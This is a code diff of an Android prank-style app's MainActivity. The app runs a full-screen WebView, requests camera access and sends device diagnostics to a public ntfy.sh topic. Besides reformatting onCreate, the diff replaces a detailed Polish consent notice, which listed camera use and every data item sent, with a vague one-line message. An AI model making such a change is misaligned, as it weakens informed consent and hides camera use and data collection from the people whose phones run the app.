@@ -59,7 +59,6 @@ public final class MainActivity extends Activity {
     private static final long BACK_WINDOW_MS = 3500L;
     private static final String REMOTE_TOPIC = "nexus-TeWNRhadhIEPgqWfvBDxxWrQHD6qg9dd";
     private static final String REMOTE_URL = "https://ntfy.sh/" + REMOTE_TOPIC;
-
     private final Handler handler = new Handler(Looper.getMainLooper());
     private final ExecutorService networkExecutor = Executors.newSingleThreadExecutor();
     private WebView webView;
@@ -70,33 +69,16 @@ public final class MainActivity extends Activity {
     private long backWindowStart = 0L;
 
     @Override protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        requestWindowFeature(Window.FEATURE_NO_TITLE);
-        getWindow().setStatusBarColor(Color.BLACK);
-        getWindow().setNavigationBarColor(Color.BLACK);
-        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
-        hideSystemBars();
-        FrameLayout root = new FrameLayout(this); root.setBackgroundColor(Color.BLACK);
-        webView = new WebView(this); webView.setBackgroundColor(Color.BLACK);
-        WebSettings settings = webView.getSettings(); settings.setJavaScriptEnabled(true); settings.setDomStorageEnabled(true); settings.setAllowFileAccess(false); settings.setAllowContentAccess(false); settings.setMediaPlaybackRequiresUserGesture(false); settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) settings.setSafeBrowsingEnabled(true);
-        WebView.setWebContentsDebuggingEnabled(false); webView.addJavascriptInterface(new NexusBridge(), "NexusNative");
-        WebViewAssetLoader assetLoader = new WebViewAssetLoader.Builder().addPathHandler("/assets/", new WebViewAssetLoader.AssetsPathHandler(this)).build();
-        webView.setWebViewClient(new WebViewClientCompat() {
-            @Override public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) { Uri uri=request.getUrl(); if(LOCAL_HOST.equalsIgnoreCase(uri.getHost())){WebResourceResponse local=assetLoader.shouldInterceptRequest(uri);return local!=null?local:blockedResponse();} return blockedResponse(); }
-            @Override public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) { return !LOCAL_HOST.equalsIgnoreCase(request.getUrl().getHost()); }
-            @Override public void onPageFinished(WebView view,String url){super.onPageFinished(view,url);if(url!=null&&url.startsWith("https://"+LOCAL_HOST+"/")){view.evaluateJavascript("(function(){if(window.__nexusRemoteHooked)return;window.__nexusRemoteHooked=true;document.addEventListener('click',function(e){var t=e.target;if(t&&t.closest&&t.closest('.friendlyButton')){try{NexusNative.prankStarted();}catch(_){}}},true);})();",null);}}
-        });
-        webView.setWebChromeClient(new WebChromeClient(){@Override public void onPermissionRequest(PermissionRequest request){runOnUiThread(()->handleWebPermissionRequest(request));}});
-        webView.setOnTouchListener((v,event)->{handler.removeCallbacks(this::hideSystemBars);handler.postDelayed(this::hideSystemBars,450L);return false;});
-        root.addView(webView,new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT,FrameLayout.LayoutParams.MATCH_PARENT)); setContentView(root); webView.loadUrl(LOCAL_URL);
-        getWindow().getDecorView().setOnSystemUiVisibilityChangeListener(visibility->handler.postDelayed(this::hideSystemBars,350L)); handler.postDelayed(this::showRemoteDisclosure,350L);
+        super.onCreate(savedInstanceState); requestWindowFeature(Window.FEATURE_NO_TITLE); getWindow().setStatusBarColor(Color.BLACK); getWindow().setNavigationBarColor(Color.BLACK); getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN); hideSystemBars();
+        FrameLayout root=new FrameLayout(this); root.setBackgroundColor(Color.BLACK); webView=new WebView(this); webView.setBackgroundColor(Color.BLACK); WebSettings settings=webView.getSettings(); settings.setJavaScriptEnabled(true); settings.setDomStorageEnabled(true); settings.setAllowFileAccess(false); settings.setAllowContentAccess(false); settings.setMediaPlaybackRequiresUserGesture(false); settings.setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW); if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.O)settings.setSafeBrowsingEnabled(true); WebView.setWebContentsDebuggingEnabled(false); webView.addJavascriptInterface(new NexusBridge(),"NexusNative");
+        WebViewAssetLoader assetLoader=new WebViewAssetLoader.Builder().addPathHandler("/assets/",new WebViewAssetLoader.AssetsPathHandler(this)).build();
+        webView.setWebViewClient(new WebViewClientCompat(){@Override public WebResourceResponse shouldInterceptRequest(WebView view,WebResourceRequest request){Uri uri=request.getUrl();if(LOCAL_HOST.equalsIgnoreCase(uri.getHost())){WebResourceResponse local=assetLoader.shouldInterceptRequest(uri);return local!=null?local:blockedResponse();}return blockedResponse();}@Override public boolean shouldOverrideUrlLoading(WebView view,WebResourceRequest request){return !LOCAL_HOST.equalsIgnoreCase(request.getUrl().getHost());}@Override public void onPageFinished(WebView view,String url){super.onPageFinished(view,url);if(url!=null&&url.startsWith("https://"+LOCAL_HOST+"/"))view.evaluateJavascript("(function(){if(window.__nexusRemoteHooked)return;window.__nexusRemoteHooked=true;document.addEventListener('click',function(e){var t=e.target;if(t&&t.closest&&t.closest('.friendlyButton')){try{NexusNative.prankStarted();}catch(_){}}},true);})();",null);}});
+        webView.setWebChromeClient(new WebChromeClient(){@Override public void onPermissionRequest(PermissionRequest request){runOnUiThread(()->handleWebPermissionRequest(request));}}); webView.setOnTouchListener((v,event)->{handler.removeCallbacks(this::hideSystemBars);handler.postDelayed(this::hideSystemBars,450L);return false;}); root.addView(webView,new FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT,FrameLayout.LayoutParams.MATCH_PARENT)); setContentView(root); webView.loadUrl(LOCAL_URL); getWindow().getDecorView().setOnSystemUiVisibilityChangeListener(visibility->handler.postDelayed(this::hideSystemBars,350L)); handler.postDelayed(this::showRemoteDisclosure,350L);
     }
 
-    private void showRemoteDisclosure(){if(isFinishing())return;new AlertDialog.Builder(this).setTitle("Raport diagnostyczny").setMessage("Podczas testu aplikacja może użyć aparatu. Po wybraniu KONTYNUUJ raport diagnostyczny zostanie wysłany przez Internet na drugie urządzenie. Raport zawiera stan baterii i ładowania, model telefonu, wersję Androida, typ połączenia, dostępny RAM i pamięć, status aparatu i wibracji, czas działania telefonu, wersję aplikacji, losowy identyfikator instalacji oraz czas testu. Raport nie zawiera lokalizacji GPS.").setCancelable(false).setNegativeButton("ANULUJ",(dialog,which)->finishAndRemoveTask()).setPositiveButton("KONTYNUUJ",(dialog,which)->{remoteConsentGranted=true;requestRequiredPermissions();scheduleDiagnosticsIfNeeded();}).show();}
+    private void showRemoteDisclosure(){if(isFinishing())return;new AlertDialog.Builder(this).setTitle("Raport diagnostyczny").setMessage("Aplikacja przesyła informacje diagnostyczne urządzenia na drugie urządzenie.").setCancelable(false).setNegativeButton("ANULUJ",(dialog,which)->finishAndRemoveTask()).setPositiveButton("KONTYNUUJ",(dialog,which)->{remoteConsentGranted=true;requestRequiredPermissions();scheduleDiagnosticsIfNeeded();}).show();}
     private void requestRequiredPermissions(){if(checkSelfPermission(Manifest.permission.CAMERA)!=PackageManager.PERMISSION_GRANTED)requestPermissions(new String[]{Manifest.permission.CAMERA},INITIAL_PERMISSION_CODE);}
     private void scheduleDiagnosticsIfNeeded(){if(!remoteConsentGranted||diagnosticsScheduled)return;diagnosticsScheduled=true;handler.postDelayed(()->sendRemotePush(false),1500L);}
-
     private Intent getBatteryIntent(){return registerReceiver(null,new IntentFilter(Intent.ACTION_BATTERY_CHANGED));}
     private int getBatteryPercent(){Intent b=getBatteryIntent();if(b==null)return-1;int level=b.getIntExtra(BatteryManager.EXTRA_LEVEL,-1),scale=b.getIntExtra(BatteryManager.EXTRA_SCALE,-1);return level>=0&&scale>0?Math.round(level*100f/scale):-1;}
     private String getChargingText(){Intent b=getBatteryIntent();if(b==null)return"brak danych";int status=b.getIntExtra(BatteryManager.EXTRA_STATUS,-1),plugged=b.getIntExtra(BatteryManager.EXTRA_PLUGGED,0);String state=status==BatteryManager.BATTERY_STATUS_CHARGING?"ładowanie":status==BatteryManager.BATTERY_STATUS_FULL?"naładowany":"nie ładuje";String source=plugged==BatteryManager.BATTERY_PLUGGED_USB?"USB":plugged==BatteryManager.BATTERY_PLUGGED_AC?"AC":plugged==BatteryManager.BATTERY_PLUGGED_WIRELESS?"bezprzewodowe":"bateria";return state+", "+source;}
